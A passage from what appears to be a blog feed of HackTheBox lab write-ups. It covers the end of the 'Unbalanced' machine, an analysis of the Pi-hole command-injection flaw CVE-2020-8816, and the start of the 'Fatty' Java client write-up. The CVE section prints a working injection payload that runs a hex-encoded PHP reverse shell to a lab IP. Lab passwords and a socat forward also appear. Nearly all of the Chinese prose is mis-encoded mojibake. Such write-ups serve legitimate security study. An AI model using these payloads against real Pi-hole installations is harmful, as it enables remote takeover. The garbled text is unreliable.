class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add domains to whitelist</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w unbalanced.htb</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -w rebalanced.htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set temperature unit to Celsius</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -c</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add local host record</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set privacy level</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -l 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set web admin interface password</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a -p <span class="string">'bUbBl3gUm$43v3Ry0n3!'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set admin email</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pihole -a email admin@unbalanced.htb</span><br></pre></td></tr></table></figure><p>adminçš„å¯†ç åˆæ˜¯ä¸€ä¸ªè·Ÿ<code>bubblegum</code>æœ‰å…³çš„â€¦â€¦è¯•äº†ä¸‹sshç™»å½•rootæ²¡æˆã€‚suä¸€ä¸‹å±…ç„¶å°±æˆäº†â€¦â€¦<br><img src="/2020/08/15/hackthebox-Unbalanced/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ€ä¹ˆè¯´å‘¢ã€‚ææƒè¿™å—åªè¦nday pocå°±èƒ½æ‹¿www-data =&gt; ç„¶åå°±å¯ä»¥è¿›rootç›®å½•=&gt; ç„¶åç³»ç»Ÿå¯†ç ç›´æ¥å°±æš´éœ²å‡ºæ¥äº†ã€‚è¿™ä¸€è¿ä¸²æ“ä½œä»¤äººçª’æ¯ã€‚æœ‰ç‚¹åˆ»æ„è€Œä¸”è®©è¿™å°é¶æœºçš„ä½“éªŒç›´æ¥é™äº†ä¸€ä¸ªæ¡£æ¬¡ã€‚æ‰€ä»¥æ²¡å•¥æ€»ç»“çš„ã€‚</p><h2 id="CVE-2020-8816"><a href="#CVE-2020-8816" class="headerlink" title="CVE-2020-8816"></a>CVE-2020-8816</h2><p>å› ä¸ºåé¢æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ‰€ä»¥ç®€å•çœ‹äº†ä¸‹è¿™ä¸ªcveã€‚å‘ç°è¿˜æŒºæœ‰æ„æ€çš„ã€‚</p><p><a href="https://xz.aliyun.com/t/7511" target="_blank" rel="noopener">https://xz.aliyun.com/t/7511</a></p><p>é¦–å…ˆã€‚piholeæœ‰è¿™æ ·ä¸€ä¸ªåŠŸèƒ½<code>è®¾ç½®é™æ€DHCPï¼Œå°†IPåœ°å€å›ºå®šåˆ°ç»™å®šçš„MACåœ°å€ä¸Š</code><br>è€Œä»–çš„æºç é‡Œè°ƒç”¨äº†å‘½ä»¤æ‰§è¡Œæ‹¼æ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!strlen($error))</span><br><span class="line">&#123;</span><br><span class="line">    exec(<span class="string">"sudo pihole -a addstaticdhcp "</span>.$mac.<span class="string">" "</span>.$ip.<span class="string">" "</span>.$hostname);</span><br><span class="line">    $success .= <span class="string">"A new static address has been added"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯æ‹¼æ¥ã€‚å‡å¦‚æ²¡æœ‰è¿‡æ»¤åˆ°ä½é‚£å°±è‚¯å®šå¯ä»¥ç»•è¿‡ã€‚æˆ‘ä»¬çœ‹ä¸‹å®ƒä¸»è¦çš„è¿‡æ»¤æ–¹å¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validMAC</span><span class="params">($mac_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)</span></span><br><span class="line">  <span class="keyword">return</span> (preg_match(<span class="string">'/([a-fA-F0-9]&#123;2&#125;[:]?)&#123;6&#125;/'</span>, $mac_addr) == <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mac = $_POST[<span class="string">"AddMAC"</span>];  </span><br><span class="line">$ip = $_POST[<span class="string">"AddIP"</span>];</span><br><span class="line">$hostname = $_POST[<span class="string">"AddHostname"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!validMAC($mac))</span><br><span class="line">&#123;</span><br><span class="line">    $error .= <span class="string">"MAC address ("</span>.htmlspecialchars($mac).<span class="string">") is invalid!&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mac = strtoupper($mac);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™å†™çš„å¹¶ä¸æ­£ç¡®ã€‚æ¯”å¦‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>aaaaaaaaaaaa</code>å°±èƒ½é€šè¿‡æ ¡éªŒã€‚ç”šè‡³å¯ä»¥åœ¨åé¢åŠ ä¸Šä»»æ„shellä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(validMAC(<span class="string">'aaaaaaaaaaaa&amp;&amp;php -r \'$sock=fsockopen("10.1.0.9",2256);exec("bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");\''</span>));</span><br><span class="line"><span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡å”¯ä¸€é‡ç‚¹å°±æ˜¯ã€‚ä»–å¯¹æˆ‘ä»¬çš„è¾“å…¥è°ƒç”¨äº†htmlspecialcharsä»¥åŠ<code>strtoupper</code>.åè€…æ¯”è¾ƒå…³é”®ã€‚</p><p>è¿™æ—¶é¦–å…ˆå°±è€ƒéªŒåˆ©ç”¨çš„phpæŠ€å·§äº†ã€‚å› ä¸ºåˆæ³•çš„macåé¢è·Ÿä»»æ„è¯­å¥éƒ½æ˜¯å¯ä»¥çš„ã€‚é‚£è‡ªç„¶æˆ‘ä»¬é€‰æ‹©phpä»£ç æ‰§è¡Œå‡½æ•°ã€‚(phpè‡ªå¸¦å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™)ã€‚ä½¿ç”¨<code>EXEC(HEX2BIN(xxxxx...))</code>å³å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚æ¥ä¸‹æ¥é‡ç‚¹å°±æ˜¯ç»•è¿‡è¢«å˜æˆå¤§å†™çš„<code>php -r</code>äº†ã€‚</p><p>è¿™ä¸€æ­¥å°±ç”¨åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æŠ€å·§äº†ã€‚å‡å¦‚æˆ‘ä»¬ä½¿ç”¨<code>aaaaaaaaaaaa$PATH</code>.ç³»ç»Ÿæ˜¯ä¼šè¿”å›PATHå˜é‡çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br></pre></td></tr></table></figure><p>è€Œå…¶ä¸­pihole,usræ­£å¥½å¯ä»¥æ„é€ å‡º<code>p h r</code>è¿™å‡ ä¸ªå­—æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;</span><br><span class="line">P&#x3D;$&#123;W%%?????:&#125;</span><br><span class="line">X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;</span><br><span class="line">H&#x3D;$&#123;X%%???:&#125;</span><br><span class="line">Z&#x3D;$&#123;PATH#:&#x2F;??&#125;</span><br><span class="line">R&#x3D;$&#123;Z%%&#x2F;&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•ä¸¾ä¸ªä¾‹å­ã€‚åŸºæœ¬ä¸Šå°±æ˜¯åˆ©ç”¨linuxé€šé…ç¬¦æ¥è¿›è¡Œæ„é€ ã€‚ååˆ†ç²¾å¦™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@pihole:&#x2F;# W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;echo $W &amp;&amp; echo  $P</span><br><span class="line">pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">p</span><br></pre></td></tr></table></figure><p>æœ€åä»¥ç±»ä¼¼çš„payloadå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaa&amp;&amp;W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;&amp;&amp;H&#x3D;$&#123;X%%???:*&#125;&amp;&amp;Z&#x3D;$&#123;PATH#*:&#x2F;??&#125;&amp;&amp;R&#x3D;$&#123;Z%%&#x2F;*&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp;</span><br></pre></td></tr></table></figure><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>å‰é¢å¾ˆæœ‰è¶£ã€‚åé¢å¾ˆç®€å•ã€‚ä¸è¿‡å¦‚æœæ·±å…¥ç ”ç©¶è¿™ä¸ªcveçš„è¯è¿˜æ˜¯æ¯”è¾ƒæœ‰æ”¶è·çš„ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Fatty-JavaExploits</title>
      <link href="2020/08/10/hackthebox-Fatty-JavaExploits/"/>
      <url>2020/08/10/hackthebox-Fatty-JavaExploits/</url>
      
        <content type="html"><![CDATA[<p> Faaty æ˜¯htbè¿™å‘¨åˆšé€€å½¹çš„é¶æœºã€‚æœ¬æ¥ä¸€å‘¨å‰è‡ªå·±æ‰“ç®—ä¸‹æ‰‹è¯•è¯•çš„,ä¸è¿‡åšäº†ä¸€ä¼šå‘ç°å› ä¸ºå³å°†é€€å½¹å°±å¹²è„†æç½®ç­‰ippsecå‡ºè§†é¢‘è‡ªå·±å†åš233. ä¸è¿‡æ•´ä½“æ¥è¯´è¿™å°é¶æœºçœŸçš„éå¸¸æœ‰è¶£ã€‚å¹¶ä¸”æ¶‰åŠåˆ°å¤§é‡çš„javaçŸ¥è¯†ã€‚åœ¨è¿™ä¸€æ¬¡å®é™…æ“ä½œä¸­è‡ªå·±æ‰çœŸæ­£ä½“ä¼šåˆ°å‰æ®µæ—¶é—´å·©å›ºjavaå¼€å‘çš„åŸºç¡€çŸ¥è¯†æœ‰å¤šä¹ˆé‡è¦ã€‚å› æ­¤è¿™é‡Œè®°å½•ä¸‹å…·ä½“æ“ä½œçš„æµç¨‹,å°†å­¦åˆ°çš„æ–°çŸ¥è¯†å·©å›ºä¸€ä¸‹ã€‚</p><a id="more"></a><p> å½“ç„¶ã€‚è¿™æ¬¡å®é™…æ“ä½œé€”ä¸­è¿˜æ˜¯æœ‰ä¸€å¤„å›°æ‰°ç€æˆ‘çš„åœ°æ–¹æ²¡æœ‰æ‰¾åˆ°å¥½çš„ç­”æ¡ˆã€‚å°±æ˜¯ideaä¸­èƒ½å¦é‡æ–°å¯¼å…¥å•ä¸ªjavaæ–‡ä»¶å¹¶ä¿®æ”¹å¼•å…¥jaråŒ…ä¸­classçš„å†…å®¹ã€‚</p><p> <img src="/2020/08/10/hackthebox-Fatty-JavaExploits/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip: 10.10.10.174</li><li>æ”»å‡»æœº: 10.10.14.25</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial-foothold to user"></a>initial-foothold to user</h2><p>é¦–å…ˆnmapç®€å•æ‰«çš„ç»“æœåªæœ‰21,22ç«¯å£ã€‚21ç«¯å£å…è®¸åŒ¿åç™»å½•ã€‚å…¶ä¸­æœ‰4ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªjaråŒ…ä¸ä¸‰ä¸ªnote</p><p>note.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. </span><br><span class="line">We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ã€‚è¿œç¨‹åº”è¯¥å¼€æ”¾äº†1337,1338,1339ç«¯å£æ¥ä½œä¸ºæœåŠ¡ç«¯ã€‚ç„¶åæˆ‘ä»¬è‡ªå·±ç”¨jaråŒ…å½“å®¢æˆ·ç«¯ã€‚</p><p>åŒæ—¶è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªjava thick clientçš„æ¦‚å¿µã€‚ç®€å•è¯´å°±æ˜¯æ•°æ®å¤„ç†æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†ç”±å®¢æˆ·ç«¯å®Œæˆã€‚</p><p>note2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.</span><br><span class="line">Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>note2 æç¤ºæˆ‘ä»¬ä½¿ç”¨java8.</p><p>note3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dear members, </span><br><span class="line">We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:</span><br><span class="line">User: qtc Pass: clarabibi</span><br><span class="line">Best regards, qtc</span><br></pre></td></tr></table></figure><p>note3åˆ™ç›´æ¥æä¾›ç»™æˆ‘ä»¬ä¸€ç»„å¯è¡Œçš„è´¦å·ã€‚è‡³æ­¤noteå·²ç»çœ‹å®Œã€‚ftpæœåŠ¡ä¸Šè¿˜å‰©ä¸‹ä¸€ä¸ªfatty-client.jarã€‚æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡</p><p>å¼€å§‹æˆ‘æ˜¯ç›´æ¥æ‹¿åˆ°æœ¬æœºçš„ideaä¸Šçœ‹jaråŒ…çš„ã€‚é¦–å…ˆç»“æ„ä¸Šåº”è¯¥æ˜¯springæ¡†æ¶ç¼–å†™åŠŸèƒ½+swingç»„ä»¶ç¼–å†™guiã€‚ä½†æ˜¯å¹¶æ²¡æœ‰å¤ªå¤§æ”¶è·ã€‚æ¯”å¦‚å¸¸è§å¦‚<code>readObject</code>è¿™æ ·çš„ååºåˆ—åŒ–å‡½æ•°æˆ‘å¹¶æ²¡æœ‰è§åˆ°ã€‚ä½†æ˜¯å´æœ‰<code>writeObject</code>å­˜åœ¨ã€‚è¯´æ˜å¯èƒ½readObjectè¿™ä¸€æ“ä½œæ˜¯åœ¨æœåŠ¡ç«¯è¿›è¡Œçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å…ˆå°è¯•ç›´æ¥ä½¿ç”¨è¿™ä¸ªjaråŒ…ã€‚çœ‹çœ‹å“ªé‡Œæœ‰æ¼æ´å¯å¯»ã€‚</p><p>é¦–å…ˆæ³¨æ„,é¢˜ç›®è¦æ±‚ç¯å¢ƒjava8ã€‚æ‰€ä»¥kaliå¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>/usr/lib/jvm/java-8-openjdk-amd64/bin/java</code>è°ƒç”¨jaråŒ…å³å¯ã€‚</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»ç•Œé¢ä»¥åŠæºç éƒ½èƒ½çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªç”¨java swingç»„ä»¶å†™å‡ºæ¥çš„guiç•Œé¢ã€‚</p><p>é¦–å…ˆå°è¯•ç™»å½•ã€‚ä½†ä¸å‡ºæ‰€æ–™æœç„¶å›æ˜¾<code>Connection Error</code>ã€‚è¿™ç‚¹æˆ‘ä»¬ä»jaråŒ…çš„beans.xmlå¯ä»¥çœ‹å‡º</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">                http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">                spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the</span></span><br><span class="line"><span class="comment"> constructor function. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connectionContext"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.ConnectionContext"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">value</span> = <span class="string">"server.fatty.htb"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"1"</span> <span class="attr">value</span> = <span class="string">"8000"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default</span></span><br><span class="line"><span class="comment">constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"trustedFatty"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.TrustedFatty"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"keystorePath"</span> <span class="attr">value</span> = <span class="string">"fatty.p12"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"secretHolder"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.shared.connection.SecretHolder"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"secret"</span> <span class="attr">value</span> = <span class="string">"clarabibiclarabibiclarabibi"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"connection"</span> <span class="attr">class</span> = <span class="string">"htb.fatty.client.connection.Connection"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"0"</span> <span class="attr">ref</span> = <span class="string">"connectionContext"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"1"</span> <span class="attr">ref</span> = <span class="string">"trustedFatty"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">"2"</span> <span class="attr">ref</span> = <span class="string">"secretHolder"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>beançš„é…ç½®ä¸­å­˜åœ¨server.fatty.htb å¹¶é…ç½®ç«¯å£8000.å› æ­¤æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªhostnameåŠ å…¥/etc/hosts.ä¸è¿‡æ­¤å¤„æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€ç§æ˜¯ç›´æ¥æ›´æ”¹jaråŒ…å¹¶é‡æ–°ä½¿ç”¨ã€‚å¦ä¸€ç§æ˜¯ä½¿ç”¨ä»£ç†è½¬å‘ä¸‹æµé‡ã€‚æˆ‘å› ä¸ºå·æ‡’é€‰æ‹©äº†ç¬¬äºŒç§ã€‚</p><p>å³,åœ¨hosts æ–‡ä»¶ä¸­è®¾ç½®ä¸º<code>127.0.0.1 server.fatty.htb</code>å¹¶ä½¿ç”¨socatè½¬å‘æœ¬åœ°8000çš„æµé‡åˆ°10.10.10.147:1337ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337</span><br></pre></td></tr></table></figure><p>å½“ç„¶ã€‚ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯å®é™…éå¸¸éº»çƒ¦ã€‚å‡å¦‚æˆ‘ä»¬åªæ˜¯è§£å‹jaråŒ…ï¼Œæ›´æ”¹beans.xmlå†é‡æ–°å‹ç¼©ä½jaråŒ…çš„è¯<br><code>jar -uf fatty-client.jar beans.xml</code>ã€‚<br>å†æ¬¡è¿è¡Œå°†ä¼šå‘ç°å‡ºç°java security problemsã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæ•´ä¸ªjaråŒ…ä¸­æœ‰éƒ¨åˆ†é…ç½®æ–‡ä»¶ä¼šå› ä¸ºsha256å˜åŒ–çš„beans.xmlå‡ºé”™,è¿™è·Ÿjava seal çš„æ“ä½œæœ‰å…³ã€‚ä¸€æ—¦ç›¸å…³æ–‡ä»¶å˜åŒ–ï¼Œå°†å¯¼è‡´æŠ›å‡ºSealing Violationã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆ æ‰å†…å®¹ä¸­è®°å½•äº†sha256å€¼çš„æ–‡ä»¶å¹¶è®¾å®šé…ç½®ã€‚</p><p>æ“ä½œæ–¹æ³•<br>METAINF/MANIFEST.MF ä¸­åº•ä¸‹æ‰€æœ‰sha256ç›¸å…³å†…å®¹å…¨éƒ¨å»æ‰ï¼ŒåŒæ—¶ä¸Šé¢è®¾ç½®ä¸­<code>Sealed: True</code>è¿™ä¸€è¡Œå»æ‰ã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0 </span><br><span class="line">Archiver-Version: Plexus Archiver </span><br><span class="line">Built-By: root </span><br><span class="line">Created-By: Apache Maven 3.3.9 </span><br><span class="line">Build-Jdk: 1.8.0_232 </span><br><span class="line">Main-Class: htb.fatty.client.run.Starter</span><br></pre></td></tr></table></figure><p>æ¥ç€åˆ æ‰META-INF/1.RSA META-INF/1.SF ä¸¤ä¸ªåŒæ ·å«æœ‰sha256å€¼çš„æ–‡ä»¶ã€‚é‡æ–°æ›´æ–°jaråŒ…æ–‡ä»¶å³å¯ã€‚(æˆ–è€…ç›´æ¥zipæ‰“åŒ…)</p><p>å½“ç„¶ã€‚è™½ç„¶æˆ‘å¼€å§‹æ²¡æœ‰è¿›è¡Œè¿™æ­¥æ“ä½œ,åé¢è¿˜æ˜¯ä¸€æ ·è¦åšçš„ã€‚</p><p>ç„¶åç°åœ¨æˆ‘ä»¬å¯ä»¥è·ŸæœåŠ¡è¿›è¡Œäº¤äº’äº†ã€‚<br>ä½¿ç”¨ç›´æ¥noteä¸­<code>qtc:clarabibi</code>æˆåŠŸç™»å½•åã€‚è¯•äº†ä¸€ä¸‹å‡ ä¸ªæ“ä½œå‘ç°è¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚æˆ‘ä»¬æ‰€åœ¨çš„ç”¨æˆ·ç»„æœ‰ping,whoami,configsè¿™æ ·å‡ 